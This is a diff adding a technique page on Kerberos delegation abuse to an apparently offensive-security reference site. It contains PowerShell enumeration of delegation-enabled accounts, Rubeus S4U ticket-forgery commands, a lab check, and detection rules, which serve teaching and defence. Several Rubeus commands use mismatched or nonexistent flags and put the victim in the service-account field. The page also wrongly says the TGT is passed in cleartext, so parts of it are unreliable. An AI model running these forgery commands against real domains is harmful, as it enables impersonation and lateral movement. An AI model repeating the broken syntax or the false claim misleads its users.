@@ -1,0 +1,171 @@
+---
+title: Kerberos Delegation Abuse
+mitre: T1558
+category: credential-access
+group: Kerberos Attacks
+summary: Abuse constrained or unconstrained Kerberos delegation to capture or replay a user's TGT from a service.
+platform: [Windows]
+tags: ['Kerberos', 'Active Directory', 'Rubeus', 'S4U']
+updated: '2026-09-04'
+author: thehackersbrain
+readingTime: 9 min read
+callChain:
+  - call: Enumerate delegation-enabled accounts
+    desc: LDAP reads of msDS-AllowedToDelegateTo or the userAccountControl delegation bit reveal the target services.
+    dll: '-'
+  - call: Authenticate to the service
+    desc: When the client requests a delegated ticket, the user's TGT is forwarded to the service.
+    dll: krb5
+  - call: Capture or forge S4U tickets
+    desc: The service holds the user's TGT, or issues S4U2Self and S4U2Proxy tickets in that user's name.
+    dll: krb5
+  - call: Move laterally as the user
+    desc: The captured TGT or forged service tickets reach downstream systems under the victim's identity.
+    dll: '-'
+detections:
+  - src: EVENT 4769
+    text: A TGS request with delegated or S4U flags issued by an account that is not a registered service principal.
+  - src: LDAP / EDR
+    text: msDS-AllowedToDelegateTo or msDS-AllowedToActOnBehalfOfOtherIdentity is added to a low-privileged account.
+  - src: BEHAVIORAL
+    text: One service account issues tickets for many different users to many downstream SPNs inside a short window.
+  - src: EVENT 4624
+    text: Network logons as multiple distinct users originate from a single service host.
+related:
+  - mitre: T1550.003
+    title: Pass the Ticket
+    desc: The captured or forged ticket is spent the same way; this page is how it gets captured in the first place.
+    href: /techniques/credential-access/pass-the-ticket
+  - mitre: T1558.001
+    title: Golden Ticket
+    desc: The forgery baseline; delegation abuse forges S4U tickets, a golden ticket forges TGTs directly.
+    href: /techniques/credential-access/golden-ticket
+  - mitre: T1558.003
+    title: Kerberoasting
+    desc: Sibling ticket-attack; both enumerate service principals, delegation goes through the service account.
+    href: /techniques/credential-access/kerberoasting
+  - mitre: T1003.006
+    title: DCSync
+    desc: The credential-dumping endpoint a successful unconstrained relay into a DC can open up.
+    href: /techniques/credential-access/dcsync
+labKit:
+  - label: Rubeus
+    href: 'https://github.com/GhostPack/Rubeus'
+  - label: Active Directory delegation lab
+    href: /lab
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Kerberos delegation lets a service act on behalf of the user who authenticated to it. A user
+requests a ticket for the service, and if the service is configured to accept delegation, the
+KDC can issue that service a ticket that carries the user's identity along with it. The service
+can then present that identity to a downstream system, so the user's access follows the request
+through a chain of services without the user re-authenticating at each hop.
+
+There are three configurations that matter to an attacker. **Unconstrained delegation** hands the
+service the user's actual TGT, which means the service can impersonate the user anywhere the user
+is allowed to go. **Constrained delegation** restricts the forwarded identity to a list of
+service principals named in the account's `msDS-AllowedToDelegateTo` attribute. **Resource-based
+constrained delegation** is the reverse-direction variant: the downstream machine account names
+the upstream accounts it will accept delegated identities from, in
+`msDS-AllowedToActOnBehalfOfOtherIdentity`. Each one maps to a different capture or forgery
+play, and each is enumerated the same way - by reading the AD attributes that switch it on.
+
+<Callout type="caution">
+  Unconstrained delegation is the most damaging and the least controlled. The service receives
+  the user's TGT in cleartext over the service channel, and from that point the service - or any
+  process that can read its memory - can replay that TGT across the domain. Constrained and
+  resource-based delegation do not hand over the TGT; they let the attacker forge scoped service
+  tickets with the right keys. The detection signals differ accordingly.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+Enumeration is an LDAP read. The exploitation step depends on which delegation mode is in play,
+and Rubeus covers the S4U forgery path for constrained and resource-based configurations.
+
+<CodeBlock
+  file="enum_delegation.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# constrained delegation targets
+Get-ADUser -Filter * -Properties msDS-AllowedToDelegateTo |
+  Where-Object { $_.msDS-AllowedToDelegateTo } |
+  Select-Object SamAccountName, msDS-AllowedToDelegateTo
+
+# resource-based constrained delegation
+Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
+  Where-Object { $_.msDS-AllowedToActOnBehalfOfOtherIdentity } |
+  Select-Object Name, msDS-AllowedToActOnBehalfOfOtherIdentity
+
+# unconstrained delegation is a userAccountControl flag
+Get-ADUser -Filter * -Properties userAccountControl |
+  Where-Object { [int]$_.userAccountControl -band 0x00040000 } |
+  Select-Object SamAccountName`}
+/>
+
+For the S4U path, the attacker needs the service account's hash, then forges a service ticket
+for the victim and impersonates the victim to a downstream SPN.
+
+<CodeBlock
+  file="rubeus_s4u.txt"
+  label="Rubeus"
+  lang="text"
+  class="mb-7.5"
+  code={`# S4U2Self: forge a service ticket for the victim, using the service's RC4 hash
+$ rubeus.exe s4u /user:CORP\\jsmith /service:app01 /servicekey:rc4:<servicehash>
+
+# S4U2Proxy: turn that into a ticket for a downstream SPN the service is allowed to reach
+$ rubeus.exe s4u /user:CORP\\jsmith /service:app01 /servicekey:rc4:<servicehash> /impersonateuser:CORP\\jsmith /altservice:SQL /alttc:CORP\\jsmith@CORP.LOCAL
+
+# pipe the result into the current session
+$ rubeus.exe s4u /user:CORP\\jsmith /service:app01 /servicekey:rc4:<servicehash> /impersonateuser:CORP\\jsmith /ptt`}
+/>
+
+## Verifying in the lab
+
+Stand up a two-hop path: a client, a middle-tier app server with constrained delegation to a
+database, and a domain controller. Trigger the delegated request from the client and watch the
+KDC issue the S4U tickets. The proof is a downstream logon as the client's user, initiated from
+the middle-tier host, with no password entered at the second hop.
+
+<CodeBlock
+  file="lab_check"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# on the database host, the delegated logon is the artifact
+# EID 4624: LogonType 3, User jsmith, SourceNetworkAddress app01
+# on the DC, the 4769 pair is the network artifact
+# TGS-REQ for app01 -> TGS-REP, then TGS-REQ for SQL as jsmith  <-- the artifact`}
+/>
+
+## Detection
+
+Delegation abuse produces a very specific ticket pattern: one service account generating tickets
+for many users, aimed at many downstream service principals.
+
+<DetectionGrid items={frontmatter.detections} />
+
+Rank them: the 4769 S4U / delegated-flag rule is the highest-fidelity continuous control,
+because it sits at the KDC and sees the ticket requests directly. The LDAP attribute-change rule
+catches the setup phase and is the cheapest way to alert before any ticket is forged. The
+multi-user / multi-SPN behavioural rule is the catch-all for a live sweep and is the one to
+tune first when KDC telemetry is sparse.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
